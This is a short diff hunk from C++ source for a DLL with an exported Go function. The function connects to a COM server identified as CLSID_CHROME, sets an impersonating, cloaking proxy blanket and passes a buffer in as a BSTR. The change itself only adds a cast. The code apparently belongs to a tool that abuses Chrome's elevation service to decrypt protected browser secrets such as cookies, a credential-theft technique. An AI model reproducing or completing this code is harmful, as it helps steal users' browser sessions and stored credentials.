@@ -37,7 +37,7 @@ extern "C" __declspec(dllexport) void __stdcall Go(void){
     HRESULT hr=CoCreateInstance((const IID&)CLSID_CHROME,NULL,CLSCTX_LOCAL_SERVER,(const IID&)IID_V2,&unk);
     if(FAILED(hr)) hr=CoCreateInstance((const IID&)CLSID_CHROME,NULL,CLSCTX_LOCAL_SERVER,(const IID&)IID_V1,&unk);
     if(FAILED(hr)||!unk){char m[48];wsprintfA(m,"cc=0x%08X",hr);WriteErr(m);return;}
-    CoSetProxyBlanket(unk,RPC_C_AUTHN_DEFAULT,RPC_C_AUTHZ_DEFAULT,NULL,
+    CoSetProxyBlanket((IUnknown*)unk,RPC_C_AUTHN_DEFAULT,RPC_C_AUTHZ_DEFAULT,NULL,
         RPC_C_AUTHN_LEVEL_PKT_PRIVACY,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,EOAC_DYNAMIC_CLOAKING);
     BSTR in=SysAllocStringByteLen(buf,rd);
     BSTR out=NULL; DWORD cerr=0;
